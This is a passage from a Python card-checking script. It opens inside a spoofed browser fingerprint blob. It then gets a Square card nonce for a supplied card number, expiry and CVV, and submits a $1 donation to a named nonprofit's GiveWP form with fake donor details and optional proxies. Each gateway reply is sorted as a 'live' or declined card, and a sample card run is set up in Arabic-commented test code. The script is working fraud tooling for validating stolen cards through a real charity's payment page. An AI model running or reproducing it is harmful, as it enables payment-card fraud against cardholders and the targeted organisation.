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"},"touch_support":{"maxTouchPoints":5,"touchEvent":true,"touchStart":true},"vendor_flavors":["chrome"],"color_gamut":"srgb","forced_colors":false,"monochrome":0,"contrast":0,"reduced_motion":false,"hdr":false,"math":{"acos":1.4473588658278522,"acosh":709.889355822726,"acoshPf":355.291251501643,"asin":0.12343746096704435,"asinh":0.881373587019543,"asinhPf":0.8813735870195429,"atanh":0.5493061443340548,"atanhPf":0.5493061443340548,"atan":0.4636476090008061,"sin":0.8178819121159085,"sinh":1.1752011936438014,"sinhPf":2.534342107873324,"cos":-0.8390715290095377,"cosh":1.5430806348152437,"coshPf":1.5430806348152437,"tan":-1.4214488238747245,"tanh":0.7615941559557649,"tanhPf":0.7615941559557649,"exp":2.718281828459045,"expm1":1.718281828459045,"expm1Pf":1.718281828459045,"log1p":2.3978952727983707,"log1pPf":2.3978952727983707,"powPI":1.9275814160560204e-50},"video_card":{"vendor":"Google Inc. (Qualcomm)","renderer":"ANGLE (Qualcomm, Adreno (TM) 810, OpenGL ES 3.2)"},"pdf_viewer_enabled":false}',
                                "fingerprint": "8d989d1bd1f2db16fbe0ccc2a4679536",
                                "version": "fingerprint-v2",
                            },
                        ],
                        "timezone": "-180",
                        "website_url": "https://chrysaliscenterct.org/",
                    },
                    "client_id": ap,
                    "instance_id": inn,
                    "location_id": lo,
                    "payment_method_tracking_id": sess,
                    "session_id": se,
                    "card_data": {
                        "cvv": card_data["cvv"],
                        "exp_month": int(card_data["mm"]),
                        "exp_year": int(card_data["yy"]),  # الآن السنة بصيغة 2026
                        "number": card_data["cc"],
                    },
                    "pow_counter": var,
                }
                resp_nonce = await session.post(
                    "https://pci-connect.squareup.com/v2/card-nonce",
                    params=params_nonce,
                    headers=headers_nonce,
                    json=json_nonce,
                )
                nonce_json = resp_nonce.json()
                cnon = nonce_json.get("card_nonce")
                if not cnon:
                    return "Error", "Failed to get card nonce", False

                # Step 6: Final POST to donation page with square-card-nonce
                headers_final = {
                    "origin": "https://chrysaliscenterct.org",
                    "referer": "https://chrysaliscenterct.org/donation/7255?giveDonationFormInIframe=1",
                    "content-type": "application/x-www-form-urlencoded",
                }
                params_final = {
                    "payment-mode": "square",
                    "form-id": "7255",
                }
                data_final = {
                    "give-fee-amount": "0.34",
                    "give-fee-mode-enable": "false",
                    "give-fee-status": "enabled",
                    "give-honeypot": "",
                    "give-form-id-prefix": pre,
                    "give-form-id": give,
                    "give-form-title": "Donation",
                    "give-current-url": "https://chrysaliscenterct.org/give/make-a-gift/",
                    "give-form-url": "https://chrysaliscenterct.org/donation/7255/",
                    "give-form-minimum": "1",
                    "give-form-maximum": "10000",
                    "give-form-hash": hash_val,
                    "give-price-id": "custom",
                    "give-amount": "1",
                    "give-fee-recovery-settings": '{"fee_data":{"all_gateways":{"percentage":"2.900000","base_amount":"0.300000","give_fee_disable":false,"give_fee_status":true,"is_break_down":true,"maxAmount":"0"}},"give_fee_status":true,"give_fee_disable":false,"is_break_down":true,"fee_mode":"donor_opt_in","is_fee_mode":true,"fee_recovery":true}',
                    "give_first": user_data["first"],
                    "give_last": user_data["last"],
                    "give_email": user_data["email"],
                    "give_comment": "",
                    "payment-mode": "square",
                    "billing_country": "US",
                    "card_address": user_data["address"],
                    "card_address_2": "",
                    "card_city": user_data["city"],
                    "card_state": user_data["state"],
                    "card_zip": user_data["zip"],
                    "card_nonce": "",
                    "give_action": "purchase",
                    "give-gateway": "square",
                    "give_embed_form": "1",
                    "square-card-nonce": cnon,
                }
                resp_final = await session.post(
                    "https://chrysaliscenterct.org/donation/7255/",
                    params=params_final,
                    headers=headers_final,
                    data=data_final,
                )
                response_text = resp_final.text.lower()

                # Step 7: Classify using RESPONSE_MAP
                for key, (status, msg, is_live) in RESPONSE_MAP.items():
                    if key in response_text:
                        return status, msg, is_live

                # Fallback JSON error extraction
                try:
                    error_data = resp_final.json()
                    if 'errors' in error_data:
                        err = error_data['errors'][0]
                        if isinstance(err, dict):
                            code = err.get('code', 'UNKNOWN_ERROR')
                            return "Declined", f"{code} ❌", False
                except:
                    pass

                return "Unknown", "Unrecognised response ❓", False

            except Exception as e:
                return "Error", f"Exception: {str(e)}", False


async def process_SQ_1_charge(card_line: str, proxy_url: str = None) -> tuple[str, str, bool]:
    card_data = tools.getcard(card_line)
    if not card_data["cc"]:
        return "Failed", "Invalid card format", False

    user_data = tools.userdata()
    proxies = {"http": proxy_url, "https": proxy_url} if proxy_url else None

    return await Gateway.charge_card(
        card_data=card_data,
        user_data=user_data,
        proxies=proxies,
    )


# ========== دالة اختبار ==========
async def main():
    # بطاقة اختبار قياسية لـ Stripe
    test_card = "4211566115568609|12|28|321"
    proxy = None  # يمكنك وضع البروكسي هنا إذا لزم الأمر

    print("🚀 جاري اختبار البوابة (ST Charge)...")
    print(f"💳 البطاقة: {test_card}")
    
    status, message, is_live = await process_SQ_1_charge(test_card, proxy_url=proxy)
    
    print("\n--- نتيجة التنفيذ ---")
    print(f"الحالة  : {status}")
    print(f"الرسالة : {message}")
    print(f"مقبولة  : {is_live}")

if __name__ == "__main__":
    asyncio.run(main())
